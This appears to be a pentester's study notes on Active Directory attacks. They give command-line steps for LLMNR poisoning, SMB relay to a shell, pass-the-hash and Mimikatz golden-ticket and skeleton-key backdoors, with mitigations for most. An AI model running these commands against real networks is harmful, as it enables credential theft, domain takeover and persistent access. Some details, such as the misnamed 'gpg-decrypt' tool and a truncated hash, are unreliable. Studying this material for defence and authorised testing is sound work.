---
title: 3 - Active Directory Exploitation
summary: Gaining Access step – a note for attacking Windows.
description: Gaining Access step – a note for attacking Windows.
---

# Resources

---

* [Pentesting Active Directory Mind Map - ODC](https://github.com/esidate/pentesting-active-directory/tree/main)
* [Top Five Ways I Got Domain Admin 2018 Edition - Adam Toscher](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

![killchain-AD-attacks_mind_map.png](../attachments/killchain-AD-attacks_mind_map.png) 
Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm

# Initial Access

---

### 1 - LLMNR Attack

### Principle

![exploit-llmnr-principle.png](../attachments/exploit-llmnr-principle.png)
Credit: TCM Security

### Hands On


 > 
 > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
 > Capture NTLM Hashes when DNS error occurs.

![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)


 > 
 > **<font color=red>hashcat -a 0 -m 5600 </font>myHashes.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
 > Crack NetNTMLv2 hashes.

### Mitigation

* Disable LLMNR and NBT-NS
  * Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Multicast Name Resolution > OFF
  * Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced > WINS > NetBIOS over TCP/IP > Disable
* If this cannot be disabled
  * Network Access Control.
  * Enforce strong user password (over 14 characters) in order to make it harder to crack hashes.

Credit: TCM Security

---

### 2 - SBM Relay Attack

### Principle

Relay captured Hashes without cracking them to a SMB Server.

### Requirements & Limitations

* SMB Signing must be disabled on the target.
* The user that is relayed has to be admin on the target.
* It is not possible to relay a user to the same machine.

### Scan for vulnerable hosts (SMB Signing disabled)

**<font color=red>nmap --script=smb2-security-mode.nse -p445</font> \[TARGET_IP\]**</br>
Scan for disabled SMB Signing.

![tool-nmap-smb_signing.png](../attachments/tool-nmap-smb_signing.png)

### Hands on

#### Capture Hashes

Update Responder configuration to capture hashes but not respond.

 > 
 > **<font color=lightblue>/usr/share/responder/Responder.conf</font>**</br>

````
[Responder Core]

; Servers to start
SQL = On
#SMB = On # HERE #
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
````


 > 
 > **<font color=red>responder -l</font> tun0 <font color=red>-dw</font>**</br>
 > Capture NTLM Hashes when DNS error occurs.

![tool-responder-llmnr_hash_capture.png](../attachments/tool-responder-llmnr_hash_capture.png)

#### Relay Attacks


 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf </font>myTargets.txt <font color=red>-smb2support --no-multirelay</font>**</br>
 > Relay NTLM Hash and Dump Sam Hashes.

![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)

**TO CHECK**

 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf</font> myTargets.txt <font color=red>-smb2support --no-multirelay -i</font>**</br>
 > Relay NTLM Hash and start a Bind Shell.

![tool-ntmlrelayx-smb_relay_reverse_shell.png](../attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)

 > 
 > **<font color=red>nc 127.0.0.1 11000</font>**
 > Connect to the shell.

### Mitigation

* Enable SMB Signing on all devices
  * Warning: May cause performance issues with file copies
* Disable NTML authentication on network
  * Warning: NTML is the backup solution when Kerberos don't work, NTML may be required by some applications.
* Limit high privilege accounts to specific tasks (e.g. Domain Admins only log when a Domain Admin access is required).
* Enforce Local admins restriction.

Credit: TCM Security

# Privilege Escalation

---

### GPP Attack

### Principle

GPP (Group Policy Preferences) are policies with credentials embedded (they are encrypted and placed in `cPassword`).

The encryption key was released, so it is possible to decrypt GPP policies that have been encrypted with this key.

### Detection


 > 
 > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**</br>
 > Detect vulnerable GPP policies (credentials encrypted with leaked key).

### Hands On


 > 
 > **<font color=red>gpg-decrypt</font> mycPasswordEncrypted**</br>
 > Decrypt GPP enmbedded credentials.

---

### Pass the Password

### Hands On


 > 
 > **<font color=red>crackmapexec smb</font> \[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-d</font> \[TARGET_DOMAIN\] <font color=red>-u</font> \[mySamName\] <font color=red>-p</font> \[myUserPassword\]**</br>
 > Pass the Password around the network to find pwnable machines.

![tool-crackmapexec-example.png](../attachments/tool-crackmapexec-example.png)


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine (Psexec is the most noisy).

 > 
 > **<font color=red>python3 /opt/impacket/examples/smbexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

 > 
 > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

---

### Pass the Hash

### Theory

Pass the Hash attack is **possible with `NTLM` authentication protocol**, but will not work with `NTLMv2`.

There are two different hash types, `LM` and `NT`:

* LM hash example: 

 > 
 > Administrator:500:<font color=red>aad3b435b51404eeaad3b435b51404ee</font>:0e0363213e37b94221497260b0bc:::

* NT hash example: 
  \>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<font color=red>0e0363213e37b94221497260b0bc:::</font>

### Hands on

#### Pass NT Hash


 > 
 > **<font color=red>crackmapexec smb </font>\[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-u</font> \[mySamName\] <font color=red>-H</font> \[myUserNTHASH\] <font color=red>--local-auth</font>**</br>
 > Pass the Hash attack (NT Hash) around the network to find vulnerable machines.


 > 
 > **<font color=red>evil-winrm -i</font> \[TARGET_IP\] <font color=red>-u</font> \[myUser\] <font color=red>-H </font>\[myUserNTHASH\]**</br>
 > Pass the Hash attack (NT Hash).

#### Pass LM+NT Hash


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py </font>\[TARGET_DOMAIN\]<font color=red>/</font>\[mySamName\]<font color=red>@</font>\[TARGET_IP\] <font color=red>-hashes</font> \[myUserLMHASH\]<font color=red>:</font>\[myUserNTHASH\]**</br>
 > Pass the Hash attack (LM+NT).

### Mitigation

* Limit account re-use:
  * Don't re-use passwords (e.g. Local Admin and Domain Admin).
  * Disable local Guest and Administrator accounts.
  * Limit who is local Administrator.
* Enforce strong password policy:
  * Long, random, no common words, ...
  * Rotate password on a regular basis.
    Credit: TCM Security

---

### Pass the Ticket

### Requirements


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

### Hands On (MIMIKATZ)


 > 
 > **<font color=red>sekurlsa::tickets /export</font>**</br>
 > Export all `.kirbi` tickets into the current directory.

 > 
 > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
 > Cache and impersonate the given ticket.

---

### Token Impersonation

### Theory

Tokens are like session cookies to access a system or network.

Delegate tokens exist on the machine the moment a user login (and remain until the computer is rebooted).

They are two types of tokens:

* Delegate: Create for logging into a machine or using Remote Desktop.
* Impersonate: Non-interactive, such as attaching a network drive or a domain logon script.
  Credit: TCM Security

### Hands on

If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.

 > 
 > **<font color=red>load incognito</font>**</br>
 > Load icognito module.
 > 
 > **<font color=red>list_tokens -u</font>**</br>
 > List Delegation Tokens available (not sure of the flag maybe `-g`).
 > 
 > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
 > Impersonate token.

To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 

The safest to pick is **services.exe**.

 > 
 > **<font color=red>migrate</font> 668**</br>
 > Migrate to process 668.

 > 
 > **<font color=red>rev2self</font>**</br>
 > Revert to previous user.

### Mitigation

* Limit user/group token creation permissions.

---

### Kerberoasting

### Principle

![exploit_kerberoasting_principle.png](../attachments/exploit_kerberoasting_principle.png)

### Requirements

* Have valid user credentials (not necessarily admin).

### Hands On


 > 
 > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
 > Get a TGS.

### Mitigation

* Have a very strong password for service accounts.
* Don’t make services accounts domain administrators.

---

### Golden/Silver Ticket

### Principle

Forge a special ticket and then is it with Pass the Ticket Attack to gain elevated privileges. 
A Golden Ticket is TGT (Ticket Granting Ticket).
A Silver Ticker is TGS (Ticket Granting Service).

### Requirements


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

### Hands On (MIMIKATZ)


 > 
 > **<font color=red>lsadump::lsa /inject /name:</font>krbtgt**</br>
 > Dump hash and security identifier required to create a Golden Ticket. 

Note: To create a Silver Ticket, change the `/name:` to a domain admin account or a service account.

![exploit-lsadump-golden_ticket.png](../attachments/exploit-lsadump-golden_ticket.png)
Credit: TCM Security

 > 
 > **<font color=red>kerberos::golden /user:</font>Administrator <font color=red>/domain:</font>mycontroller.local <font color=red>/sid:</font>S-1-5-21-432953485-3795405108-1502158860  <font color=red>/krbtgt:</font>72cd714611b64cd4d5550cd2759db3f6 <font color=red>/id:500 /ptt</font>**</br>
 > Create a golden ticket (`/ptt` stands for Pass The Ticket, if we don’t put it, the command will save the ticket to a file).

Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtgt:` slot, the sid of the service account into `/sid:`, and change the `/id:` to 1103.


 > 
 > **<font color=red>misc::cmd</font>**</br>
 > Open a new elevated command prompt with the given ticket in Minikatz.

 > 
 > **<font color=red>dir \\\\TARGET-MACHINE-NAME\\c$</font>**</br>
 > List files in c drive of the machine.

 > 
 > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**
 > Get a shell on the machine.

# Persistence

---

### Skeleton Key

### Principle

The Skeleton Key is backdoor: this attack set a master password for domain Admin. It will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques 

### Requirements


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

### Hands On


 > 
 > **<font color=red>misc::skeleton</font>**</br>
 > Create a backdoor with credentials "mimikatz". 

 > 
 > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**
 > List C: drive content using Skleton Key backdoor. 
